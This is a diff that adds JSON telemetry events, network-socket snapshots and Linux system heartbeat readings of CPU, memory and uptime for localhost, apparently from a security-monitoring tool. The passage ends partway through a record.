@@ -1,6 +1,1170 @@
 {
   "rawEvents": [
     {
+      "id": "WIN-NET-fcdcf797",
+      "source": "network",
+      "eventType": "Network Socket & Interface Telemetry",
+      "rawPayload": "ActiveSockets: 0, ListeningPorts: [], Interfaces: ['169.254.8.1', '127.0.0.1']",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Passive socket inspection: 0 active sockets, 0 listening ports.",
+        "features": {
+          "total_sockets": 0,
+          "listening_ports_count": 0,
+          "syn_sent_count": 0,
+          "is_packet_sniffing": false
+        },
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-17T17:32:49.502Z",
+      "sourceIp": "169.254.8.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": null,
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "26b8c8feaa541495a413c299e298e4cb4419626ab424f0165d245110dcf6ef22",
+      "createdAt": "2026-09-17T17:32:49.506Z"
+    },
+    {
+      "id": "WIN-NET-6881c6f9",
+      "source": "network",
+      "eventType": "Network Socket & Interface Telemetry",
+      "rawPayload": "ActiveSockets: 0, ListeningPorts: [], Interfaces: ['169.254.8.1', '127.0.0.1']",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Passive socket inspection: 0 active sockets, 0 listening ports.",
+        "features": {
+          "total_sockets": 0,
+          "listening_ports_count": 0,
+          "syn_sent_count": 0,
+          "is_packet_sniffing": false
+        },
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-17T17:32:42.113Z",
+      "sourceIp": "169.254.8.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": null,
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "70781fd0ecd7f4cab6a3f32ec19e9df0688942b73b6cfdf12cc7d57a9320ebb2",
+      "createdAt": "2026-09-17T17:32:42.117Z"
+    },
+    {
+      "id": "WIN-NET-b93d362f",
+      "source": "network",
+      "eventType": "Network Socket & Interface Telemetry",
+      "rawPayload": "ActiveSockets: 0, ListeningPorts: [], Interfaces: ['169.254.8.1', '127.0.0.1']",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Passive socket inspection: 0 active sockets, 0 listening ports.",
+        "features": {
+          "total_sockets": 0,
+          "listening_ports_count": 0,
+          "syn_sent_count": 0,
+          "is_packet_sniffing": false
+        },
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-17T17:31:38.443Z",
+      "sourceIp": "169.254.8.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": null,
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "51094d174e08ad0953523ec2b6f2c75ec60078b9f228f9897b34c96f19145b17",
+      "createdAt": "2026-09-17T17:31:38.448Z"
+    },
+    {
+      "id": "WIN-NET-18658bb0",
+      "source": "network",
+      "eventType": "Network Socket & Interface Telemetry",
+      "rawPayload": "ActiveSockets: 0, ListeningPorts: [], Interfaces: ['169.254.8.1', '127.0.0.1']",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Passive socket inspection: 0 active sockets, 0 listening ports.",
+        "features": {
+          "total_sockets": 0,
+          "listening_ports_count": 0,
+          "syn_sent_count": 0,
+          "is_packet_sniffing": false
+        },
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-17T17:31:13.848Z",
+      "sourceIp": "169.254.8.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": null,
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "079ec7e6281d0c426b5bf9769194d001427e6a761aa0e4fe68731de686b02d03",
+      "createdAt": "2026-09-17T17:31:13.877Z"
+    },
+    {
+      "id": "SYS-1789666064626-d75c64",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2644,\"cpuCount\":2,\"cpuUsagePercent\":0.2,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370168320,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57919224,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.2%, Memory 21.5% (3214MB free).",
+        "features": {
+          "cpuUsage": 0.2,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:44.626Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "61c6529793a96a4e6fc22f98f3cb8bb963edf0bf0405fef9fc2623a0a6ae069b",
+      "createdAt": "2026-09-17T17:27:44.627Z"
+    },
+    {
+      "id": "SYS-1789666060626-073f70",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2640,\"cpuCount\":2,\"cpuUsagePercent\":25.8,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370418176,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57699880,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 25.8%, Memory 21.5% (3214MB free).",
+        "features": {
+          "cpuUsage": 25.8,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:40.626Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "05dbff6df5b70640f98dc3e09382e57f46b52746b39975718ce6f2aa2a32e5c9",
+      "createdAt": "2026-09-17T17:27:40.626Z"
+    },
+    {
+      "id": "SYS-1789666056637-ee2c10",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2636,\"cpuCount\":2,\"cpuUsagePercent\":68.1,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":2785906688,\"usedMemoryPercent\":35.1,\"processCount\":1,\"heapUsedBytes\":57481808,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 68.1%, Memory 35.1% (2657MB free).",
+        "features": {
+          "cpuUsage": 68.1,
+          "memoryUsage": 35.1,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:36.637Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "fbfaf517855d4d35e5fb1dadf215f67c975de8b402b5bc685e6c8a3a614a5850",
+      "createdAt": "2026-09-17T17:27:36.638Z"
+    },
+    {
+      "id": "SYS-1789666052627-38830c",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2632,\"cpuCount\":2,\"cpuUsagePercent\":66.5,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":2999738368,\"usedMemoryPercent\":30.2,\"processCount\":1,\"heapUsedBytes\":57265016,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 66.5%, Memory 30.2% (2861MB free).",
+        "features": {
+          "cpuUsage": 66.5,
+          "memoryUsage": 30.2,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:32.627Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "5b7337e9fa5cb623d407ad49542b1a8a3b776963e90008edac17ea333101dcc6",
+      "createdAt": "2026-09-17T17:27:32.627Z"
+    },
+    {
+      "id": "SYS-1789666048624-1df6d7",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2628,\"cpuCount\":2,\"cpuUsagePercent\":45.4,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3313160192,\"usedMemoryPercent\":22.9,\"processCount\":1,\"heapUsedBytes\":57048968,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 45.4%, Memory 22.9% (3160MB free).",
+        "features": {
+          "cpuUsage": 45.4,
+          "memoryUsage": 22.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 54,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:28.624Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "9c1594601f1d2b4ae487fa3c9a84c70b48cd69643123b3cebebd89fecb9c2b10",
+      "createdAt": "2026-09-17T17:27:28.624Z"
+    },
+    {
+      "id": "SYS-1789666044623-ddfd76",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2624,\"cpuCount\":2,\"cpuUsagePercent\":67.9,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":2647289856,\"usedMemoryPercent\":38.4,\"processCount\":1,\"heapUsedBytes\":57902920,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 67.9%, Memory 38.4% (2525MB free).",
+        "features": {
+          "cpuUsage": 67.9,
+          "memoryUsage": 38.4,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:24.623Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "bba0aab225e30924ae27b40b93b668c22a2b2be5c9c8e88e83a63954bfdc16b0",
+      "createdAt": "2026-09-17T17:27:24.623Z"
+    },
+    {
+      "id": "SYS-1789666040635-732723",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2620,\"cpuCount\":2,\"cpuUsagePercent\":79.7,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":2708848640,\"usedMemoryPercent\":36.9,\"processCount\":1,\"heapUsedBytes\":57689960,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 79.7%, Memory 36.9% (2583MB free).",
+        "features": {
+          "cpuUsage": 79.7,
+          "memoryUsage": 36.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:20.635Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "7853a5d9cc78b4011eed39c94865624f9ccd15fa9135e4d222fda3bf944c2903",
+      "createdAt": "2026-09-17T17:27:20.635Z"
+    },
+    {
+      "id": "SYS-1789666036621-0b6ec7",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2616,\"cpuCount\":2,\"cpuUsagePercent\":76.4,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":2791325696,\"usedMemoryPercent\":35,\"processCount\":1,\"heapUsedBytes\":57478280,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 76.4%, Memory 35% (2662MB free).",
+        "features": {
+          "cpuUsage": 76.4,
+          "memoryUsage": 35,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:16.621Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "4b7c7e6750faf442d4d9b8ad61acf26b5a3e386d10abe384ab722a892e4b7afa",
+      "createdAt": "2026-09-17T17:27:16.622Z"
+    },
+    {
+      "id": "SYS-1789666032635-889b7d",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2612,\"cpuCount\":2,\"cpuUsagePercent\":57.1,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3098132480,\"usedMemoryPercent\":27.9,\"processCount\":1,\"heapUsedBytes\":57267880,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 57.1%, Memory 27.9% (2955MB free).",
+        "features": {
+          "cpuUsage": 57.1,
+          "memoryUsage": 27.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:12.635Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "dd917b0ea97f8a856ec2fdf34d6ac3cf89914720d88ea7eed608896d4c97f930",
+      "createdAt": "2026-09-17T17:27:12.635Z"
+    },
+    {
+      "id": "SYS-1789666028619-2f501d",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2608,\"cpuCount\":2,\"cpuUsagePercent\":0.2,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370897408,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57058768,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.2%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 0.2,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 54,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:08.619Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "3bcc0b3eb576c20a1e599658088c2adbb931b614ce91163f5b52544d94862d94",
+      "createdAt": "2026-09-17T17:27:08.619Z"
+    },
+    {
+      "id": "SYS-1789666024618-ee6667",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2604,\"cpuCount\":2,\"cpuUsagePercent\":0.6,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370033152,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":58058240,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.6%, Memory 21.5% (3214MB free).",
+        "features": {
+          "cpuUsage": 0.6,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:04.618Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "3eb1bcfdef82569d12804b9df5015d74c10739517397696912b0e0d3bc94e44c",
+      "createdAt": "2026-09-17T17:27:04.619Z"
+    },
+    {
+      "id": "SYS-1789666020618-4ab3dc",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2600,\"cpuCount\":2,\"cpuUsagePercent\":1,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370266624,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57850008,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1%, Memory 21.5% (3214MB free).",
+        "features": {
+          "cpuUsage": 1,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:27:00.618Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "0bef768604f2c57f56f36b79966c44834607c581015dc711ea0a7fcd931f9f82",
+      "createdAt": "2026-09-17T17:27:00.618Z"
+    },
+    {
+      "id": "SYS-1789666016618-744846",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2596,\"cpuCount\":2,\"cpuUsagePercent\":0.7,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370627072,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57644496,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.7%, Memory 21.5% (3214MB free).",
+        "features": {
+          "cpuUsage": 0.7,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:56.618Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "aefc918f73d59e7f8025dc5c9377e9a5935f18abd6131433fa28740589e54f33",
+      "createdAt": "2026-09-17T17:26:56.618Z"
+    },
+    {
+      "id": "SYS-1789666012618-25d3a3",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2592,\"cpuCount\":2,\"cpuUsagePercent\":0.7,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370856448,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57440384,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.7%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 0.7,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:52.618Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "b8c2bfb8c8b2407360b3cd965d5959678f83a146b97cc29eb21633b5e7d72864",
+      "createdAt": "2026-09-17T17:26:52.618Z"
+    },
+    {
+      "id": "SYS-1789666008617-cf5093",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2588,\"cpuCount\":2,\"cpuUsagePercent\":1.1,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3371114496,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57229664,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1.1%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 1.1,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:48.617Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "1312054d1ab15b6147249e32a84d23566365a3910471d73e9c2dd962f069721f",
+      "createdAt": "2026-09-17T17:26:48.617Z"
+    },
+    {
+      "id": "SYS-1789666004617-0532e6",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2584,\"cpuCount\":2,\"cpuUsagePercent\":1,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3371356160,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57028256,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 1,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 54,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:44.617Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "6a61492aa9ffc71fded960c72ebf02d550e0e0ff035dfd28f9473692bb139e3b",
+      "createdAt": "2026-09-17T17:26:44.617Z"
+    },
+    {
+      "id": "SYS-1789666000617-727516",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2580,\"cpuCount\":2,\"cpuUsagePercent\":0.9,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370614784,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":58003608,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.9%, Memory 21.5% (3214MB free).",
+        "features": {
+          "cpuUsage": 0.9,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:40.617Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "7cbf0c45d07453b5f748b918744ab5514d3fa7e17f1d3e9ce83263cabcddac70",
+      "createdAt": "2026-09-17T17:26:40.617Z"
+    },
+    {
+      "id": "SYS-1789665996617-d536b6",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2576,\"cpuCount\":2,\"cpuUsagePercent\":0.4,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3370848256,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57804312,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.4%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 0.4,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:36.617Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "23798587dafae87534b9b5b177c4276a740bc721161e6f97153a6a7204323601",
+      "createdAt": "2026-09-17T17:26:36.617Z"
+    },
+    {
+      "id": "SYS-1789665992616-74fc31",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2572,\"cpuCount\":2,\"cpuUsagePercent\":0.4,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3371073536,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57606688,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.4%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 0.4,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:32.616Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "1e75675cd9da2841608965de236594cac06f5f52ff8c780ef9b09732c002c596",
+      "createdAt": "2026-09-17T17:26:32.617Z"
+    },
+    {
+      "id": "SYS-1789665988615-d4b8ac",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2568,\"cpuCount\":2,\"cpuUsagePercent\":0.7,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3371315200,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57409344,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.7%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 0.7,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:28.615Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "8ba131b482061a45c7b54491d214504e92b0ce7a9e60ac7b146655d1258d5c9e",
+      "createdAt": "2026-09-17T17:26:28.616Z"
+    },
+    {
+      "id": "SYS-1789665984615-da4340",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
